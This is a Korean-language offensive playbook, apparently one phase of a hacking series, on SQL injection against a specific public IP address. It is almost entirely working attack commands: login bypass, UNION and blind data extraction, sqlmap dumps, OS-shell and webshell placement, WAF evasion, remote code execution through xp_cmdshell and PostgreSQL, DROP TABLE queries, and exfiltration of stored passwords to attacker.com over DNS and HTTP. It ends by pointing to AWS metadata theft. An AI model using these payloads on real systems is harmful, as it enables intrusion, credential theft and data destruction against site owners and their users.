# Phase 2: SQL Injection

SQL Injection은 웹 애플리케이션에서 가장 흔하고 위험한 취약점 중 하나입니다. 사용자 입력이 SQL 쿼리에 안전하게 처리되지 않을 때 발생합니다.

## 📋 목차

1. [수동 SQL Injection 테스트](#수동-sql-injection-테스트)
2. [sqlmap 자동화](#sqlmap-자동화)
3. [WAF 우회 기법](#waf-우회-기법)
4. [데이터베이스별 기법](#데이터베이스별-기법)
5. [고급 SQLi 기법](#고급-sqli-기법)

---

## 수동 SQL Injection 테스트

### 1. 기본 테스트 페이로드

```bash
# 1. 싱글 쿼터 테스트
curl -X POST http://3.35.218.180/login.php \
  -d "username='&password=test"

# 2. 기본 인증 우회
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' OR '1'='1&password=anything"

curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' OR 1=1-- -&password=anything"

curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' OR '1'='1'-- -&password=anything"

# 3. 주석을 이용한 우회
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin'-- -&password=anything"

curl -X POST http://3.35.218.180/login.php \
  -d "username=admin'#&password=anything"

curl -X POST http://3.35.218.180/login.php \
  -d "username=admin'/*&password=anything"
```

### 2. Error-based SQL Injection

```bash
# MySQL
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' AND extractvalue(1,concat(0x7e,version()))-- -&password=test"

curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' AND updatexml(1,concat(0x7e,user()),1)-- -&password=test"

# 에러 메시지로 데이터 추출
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))-- -&password=test"
```

### 3. UNION-based SQL Injection

```bash
# 1. 컬럼 수 확인
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' ORDER BY 1-- -&password=test"

curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' ORDER BY 2-- -&password=test"

curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' ORDER BY 3-- -&password=test"

curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' ORDER BY 4-- -&password=test"
# 에러 나올 때까지 증가

# 2. UNION SELECT로 데이터 추출
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' UNION SELECT 1,2,3-- -&password=test"

# 3. 데이터베이스 정보 추출
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' UNION SELECT user(),database(),version()-- -&password=test"

# 4. 테이블 목록
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()-- -&password=test"

# 5. 컬럼 목록
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -&password=test"

# 6. 사용자 데이터 덤프
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' UNION SELECT username,password,email FROM users-- -&password=test"
```

### 4. Boolean-based Blind SQL Injection

```bash
# 참/거짓 조건으로 데이터 추출

# 데이터베이스 이름 길이 확인
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' AND LENGTH(database())=1-- -&password=test"
# 길이가 맞을 때까지 증가

# 데이터베이스 이름 한 글자씩 추출
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' AND SUBSTRING(database(),1,1)='a'-- -&password=test"

curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' AND SUBSTRING(database(),1,1)='b'-- -&password=test"
# 모든 글자 확인

# ASCII 값으로 추출 (더 빠름)
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' AND ASCII(SUBSTRING(database(),1,1))>97-- -&password=test"
```

### 5. Time-based Blind SQL Injection

```bash
# MySQL - SLEEP() 사용
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' AND SLEEP(5)-- -&password=test"

# 조건부 Sleep
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' AND IF(1=1,SLEEP(5),0)-- -&password=test"

# 데이터 추출
curl -X POST http://3.35.218.180/login.php \
  -d "username=admin' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -&password=test"
```

---

## sqlmap 자동화

### 기본 사용법

```bash
# 1. GET 파라미터 테스트
sqlmap -u "http://3.35.218.180/page.php?id=1"

# 2. POST 데이터 테스트
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test"

# 3. 쿠키 포함
sqlmap -u "http://3.35.218.180/page.php?id=1" \
  --cookie="PHPSESSID=abc123"

# 4. 커스텀 헤더
sqlmap -u "http://3.35.218.180/page.php?id=1" \
  --headers="X-Forwarded-For: 127.0.0.1"
```

### 고급 옵션

```bash
# 1. 모든 파라미터 테스트
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --level=5 --risk=3 --batch

# 2. 데이터베이스 열거
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --dbs

# 3. 현재 데이터베이스
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --current-db

# 4. 테이블 목록
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  -D database_name --tables

# 5. 컬럼 목록
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  -D database_name -T users --columns

# 6. 데이터 덤프
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  -D database_name -T users --dump

# 7. 전체 데이터베이스 덤프
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --dump-all
```

### OS Shell 획득

```bash
# 1. OS Shell 시도
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --os-shell

# 2. SQL Shell
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --sql-shell

# 3. 파일 읽기
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --file-read="/etc/passwd"

# 4. 파일 쓰기
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --file-write="shell.php" \
  --file-dest="/var/www/html/shell.php"
```

---

## WAF 우회 기법

### sqlmap Tamper 스크립트

```bash
# 1. 공백을 주석으로 변경
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --tamper=space2comment

# 2. 여러 tamper 스크립트 조합
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --tamper=space2comment,between,randomcase

# 3. 유용한 tamper 스크립트
--tamper=apostrophemask        # ' → %EF%BC%87
--tamper=apostrophenullencode  # ' → %00%27
--tamper=base64encode          # Base64 인코딩
--tamper=between               # AND → BETWEEN
--tamper=chardoubleencode      # Double URL 인코딩
--tamper=charencode            # URL 인코딩
--tamper=charunicodeencode     # Unicode 인코딩
--tamper=equaltolike           # = → LIKE
--tamper=greatest              # > → GREATEST
--tamper=halfversionedmorekeywords  # MySQL 주석
--tamper=ifnull2ifisnull       # IFNULL() → IF(ISNULL())
--tamper=modsecurityversioned  # ModSecurity 우회
--tamper=modsecurityzeroversioned
--tamper=multiplespaces        # 공백 추가
--tamper=percentage            # ASP용 %
--tamper=randomcase            # 대소문자 랜덤
--tamper=randomcomments        # 랜덤 주석
--tamper=space2comment         # 공백 → 주석
--tamper=space2dash            # 공백 → --
--tamper=space2hash            # 공백 → #
--tamper=space2morehash        # 공백 → #/**/
--tamper=space2mssqlblank      # MSSQL용
--tamper=space2mssqlhash       # MSSQL #
--tamper=space2mysqlblank      # MySQL 공백
--tamper=space2mysqldash       # MySQL --
--tamper=space2plus            # 공백 → +
--tamper=space2randomblank     # 랜덤 공백
--tamper=unionalltounion       # UNION ALL → UNION
--tamper=unmagicquotes         # Magic Quotes 우회
--tamper=versionedkeywords     # MySQL 버전 주석
--tamper=versionedmorekeywords
```

### 수동 WAF 우회

```bash
# 1. 대소문자 변형
username=admin' UnIoN SeLeCt 1,2,3-- -

# 2. 주석 삽입
username=admin'/**/UNION/**/SELECT/**/1,2,3-- -
username=admin'/*!UNION*//*!SELECT*/1,2,3-- -

# 3. 인코딩
# URL 인코딩
username=admin%27%20UNION%20SELECT%201,2,3--%20-

# 이중 URL 인코딩
username=admin%2527%2520UNION%2520SELECT%25201,2,3--%2520-

# Unicode 인코딩
username=admin%u0027%20UNION%20SELECT%201,2,3--%20-

# 4. 공백 대체
username=admin'/**/UNION/**/SELECT/**/1,2,3--+-
username=admin'+UNION+SELECT+1,2,3--+-
username=admin'%09UNION%09SELECT%091,2,3--+- (TAB)
username=admin'%0AUNION%0ASELECT%0A1,2,3--+- (LF)

# 5. 키워드 분할
username=admin' UNI%00ON SELECT 1,2,3-- -
username=admin' UN/**/ION SEL/**/ECT 1,2,3-- -

# 6. 함수 사용
username=admin' AND 1=1 UNION SELECT CHAR(117,115,101,114),2,3-- -
```

---

## 데이터베이스별 기법

### MySQL

```bash
# 버전 확인
username=admin' UNION SELECT @@version,2,3-- -

# 현재 사용자
username=admin' UNION SELECT user(),2,3-- -

# 현재 데이터베이스
username=admin' UNION SELECT database(),2,3-- -

# 파일 읽기
username=admin' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -

# 파일 쓰기
username=admin' UNION SELECT '<?php system($_GET["cmd"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'-- -

# DNS Exfiltration
username=admin' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\abc')),2,3-- -
```

### PostgreSQL

```bash
# 버전
username=admin' UNION SELECT version(),2,3-- -

# 현재 사용자
username=admin' UNION SELECT current_user,2,3-- -

# 테이블 목록
username=admin' UNION SELECT tablename,2,3 FROM pg_tables WHERE schemaname='public'-- -

# RCE
username=admin'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; -- -

# 파일 읽기
username=admin' UNION SELECT pg_read_file('/etc/passwd',0,1000000),2,3-- -
```

### MSSQL

```bash
# 버전
username=admin' UNION SELECT @@version,2,3-- -

# xp_cmdshell로 RCE
username=admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; -- -

# 파일 읽기
username=admin' UNION SELECT BulkColumn,2,3 FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) AS x-- -
```

---

## 고급 SQLi 기법

### Second-Order SQL Injection

```bash
# 1. 악성 데이터 삽입
curl -X POST http://3.35.218.180/register.php \
  -d "username=admin'-- -&email=test@test.com&password=test123"

# 2. 나중에 해당 데이터가 쿼리에 사용될 때 실행
curl -X POST http://3.35.218.180/profile.php \
  -d "username=admin'-- -"
```

### Stacked Queries

```bash
# MySQL (기본적으로 불가능하지만 일부 환경에서 가능)
username=admin'; UPDATE users SET password='hacked' WHERE username='admin'-- -

# PostgreSQL (가능)
username=admin'; DROP TABLE users; -- -

# MSSQL (가능)
username=admin'; EXEC xp_cmdshell 'whoami'; -- -
```

### Out-of-Band SQL Injection

```bash
# DNS Exfiltration (MySQL)
username=admin' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\abc')),2,3-- -

# HTTP Exfiltration (MySQL with UDF)
username=admin' UNION SELECT sys_eval(CONCAT('curl http://attacker.com/?data=',(SELECT password FROM users LIMIT 1))),2,3-- -

# PostgreSQL
username=admin' UNION SELECT dblink_connect('host=attacker.com user=test password=test dbname=test'); -- -
```

---

## SQL Injection 체크리스트

- [ ] 기본 싱글 쿼터 테스트
- [ ] 인증 우회 시도
- [ ] Error-based SQLi
- [ ] UNION-based SQLi
- [ ] Boolean-based Blind SQLi
- [ ] Time-based Blind SQLi
- [ ] sqlmap 자동화 스캔
- [ ] WAF 우회 기법 적용
- [ ] 파일 읽기 시도
- [ ] 파일 쓰기 시도 (webshell)
- [ ] OS Shell 획득 시도

---

## 다음 단계

SQL Injection 성공 후:
1. 데이터베이스 전체 덤프
2. 웹쉘 업로드 (INTO OUTFILE)
3. OS Shell 획득
4. SSRF로 AWS 메타데이터 접근 (Phase 3)

[→ Phase 3: SSRF & AWS IMDS로 이동](03_ssrf_and_imds.md)
